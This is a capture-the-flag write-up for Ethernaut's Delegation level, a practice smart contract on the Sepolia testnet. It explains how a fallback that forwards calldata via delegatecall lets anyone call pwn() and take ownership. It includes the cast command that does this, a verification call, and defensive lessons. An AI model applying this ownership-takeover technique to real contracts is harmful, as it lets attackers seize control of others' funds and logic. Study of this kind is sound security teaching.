
# Ethernaut Challenge 06 — Delegation

The goal of this level is to claim ownership of the contract.

Instance address:

```
0x9294C53875B19eD1F91ecac4AE16b5895046cF1c
````

This is the address of the `Delegation` contract.

---

## 🧠 Thought process

The `Delegation` contract uses a `fallback()` function that performs a `delegatecall`:

```solidity
fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
        this;
    }
}
````

To trigger the fallback, we need to send calldata that does **not match any function** in the `Delegation` contract.

The key idea is:

* `delegatecall` executes code from another contract (`Delegate`)
* but uses the **storage of the calling contract (`Delegation`)**

The `Delegate` contract contains the function:

```solidity
function pwn() public {
    owner = msg.sender;
}
```

If we can make `Delegation` execute this function via `delegatecall`, it will overwrite:

```solidity
Delegation.owner = msg.sender;
```

---

## ⚡ Exploit

To trigger the fallback, we simply call:

```bash
cast send 0x9294C53875B19eD1F91ecac4AE16b5895046cF1c \
  "pwn()" \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

Even though `pwn()` does not exist in `Delegation`, the call is forwarded to the `Delegate` contract via `delegatecall`.

Transaction hash:

```
0x52ca2a788af632731f136d90b7e02b164b61e95235de5b029f946ca6685690a1
```

---

## ✅ Verification

We can verify that the exploit worked by checking the owner of the `Delegation` contract:

```bash
cast call 0x9294C53875B19eD1F91ecac4AE16b5895046cF1c \
    "owner()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0x000000000000000000000000ecf94300dd67bb8c31f41be3a2136d3f0abfb0b0
```

The owner is now our address.

---

## 🛡️ Security takeaway

This challenge highlights a critical risk when using `delegatecall`.

Key lessons:

* `delegatecall` executes external code in the context of the caller’s storage
* untrusted calldata can trigger unintended function execution
* fallback functions that forward arbitrary calldata are dangerous
* access control must never rely on assumptions about which functions are callable

Misusing `delegatecall` can allow attackers to overwrite critical state variables such as `owner`.

